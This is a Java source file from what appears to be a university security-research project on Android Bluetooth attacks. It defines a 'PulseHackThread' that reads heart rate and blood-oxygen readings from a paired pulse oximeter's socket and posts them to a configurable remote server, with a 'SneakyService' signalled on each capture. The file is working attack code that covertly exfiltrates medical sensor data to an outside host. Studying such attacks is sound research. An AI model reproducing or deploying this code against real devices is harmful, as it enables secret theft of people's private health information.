package edu.illinois.seclab.extDroid.pulsehack;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.ArrayList;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.ParseException;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

import edu.illinois.seclab.extDroid.Http.Hermes;
import edu.illinois.seclab.extDroid.passAttack.SneakyService;

import android.bluetooth.BluetoothSocket;
import android.os.Bundle;
import android.os.Message;
import android.util.Log;

/**
 * 
 * @author soteris demetriou
 *
 */
public class PulseHackThread extends Thread{
	private static final String TAG = "ConnectedThread";
    private final BluetoothSocket mmSocket;
    private final DataInputStream mmInStream;
    private final DataOutputStream mmOutStream;
    byte[] buf = new byte[50];  // buffer store for the stream
    byte[] arrayOfByte;
	
	public PulseHackThread(BluetoothSocket socket) {
        mmSocket = socket;
        InputStream tmpIn = null;
        OutputStream tmpOut = null;
 
        // Get the input and output streams, using temp objects because
        // member streams are final
        try {
            tmpIn = socket.getInputStream();
            tmpOut = socket.getOutputStream();
        } catch (IOException e) { }
 
        mmInStream = new DataInputStream(tmpIn);
        mmOutStream = new DataOutputStream (tmpOut);
    }
	
	public void run() {
		Log.i(TAG, "Running");
		
		while(true){
			
			try {
				sleep(100);
				requestData();
				deserialize(mmInStream);
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			
		}
	}

	private void deserialize(DataInputStream paramDataInput) throws IOException{
    	
    		int availableBytes = paramDataInput.available();
    		
    		
//    		for(int i = 0; i < availableBytes; i++){
//    			int new_byte = paramDataInput.readUnsignedByte();
//    			int j = i + 1;
//    			Log.i(TAG, "Byte " + j + ": 0x" + Integer.toHexString(new_byte));
//    			
//    			
//    		}
    		Log.i(TAG, "--------------------------------");
    		
    		if(availableBytes > 0){
	    		int arraySize = paramDataInput.read(buf);
	    		arrayOfByte = new byte[arraySize];
	    		
	    		for(int i = 0; i < arraySize; i++){
	    			arrayOfByte[i] = buf[i];
	    		}
	    		//dataHandler.handleData(arrayOfByte);
	    		
	    		handleData(arrayOfByte);
	    		
	    		sendGotDataMsg();
    		}
    	
    }
	
	private void sendGotDataMsg() {
		// TODO Auto-generated method stub
    	Message msg = new Message();
		msg.what = SneakyService.GOT_PO_DATA;
		SneakyService.sshandler.sendMessage(msg);
	}
	
	private void handleData(byte[] arrayOfBytes) {
		// TODO Auto-generated method stub
		byte hr_carries = (byte) (arrayOfBytes[0] & 0x03);
		
		final short heartrate = (short) ((hr_carries << 8) | (arrayOfBytes[1] & 0xFF));
		final int boxygen = arrayOfBytes[2];
		
		//HashMap<String, String> map = new HashMap<String, String>();
		//map.put("heartrate", "" + heartrate);
		//map.put("boxygen", "" + boxygen);
		String sheartrate = heartrate + "";
		String sboxygen = boxygen + "";
		
		sendData(sheartrate, sboxygen);
	}

	private void sendData(String heartrate, String boxygen) {
		
		 Hermes hermes = new Hermes();
		 ArrayList<NameValuePair> data_list = new ArrayList<NameValuePair>();
		    
		 data_list.add(new BasicNameValuePair("id", Preferences.data_request_id));
		 data_list.add(new BasicNameValuePair("heartrate", heartrate));
		 data_list.add(new BasicNameValuePair("boxygen", boxygen));
		 //
		 Log.i(TAG, "Sending data ...");
		 HttpResponse response = hermes.send_post(data_list, Preferences.server_url);
		 if (response != null){
		 	String result;
			try {
				result = EntityUtils.toString( response.getEntity());
				Log.i(TAG, "result: " + result);
			} catch (ParseException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		  	
		 }
	}

	private void requestData() {
		// TODO Auto-generated method stub
		
	}
}


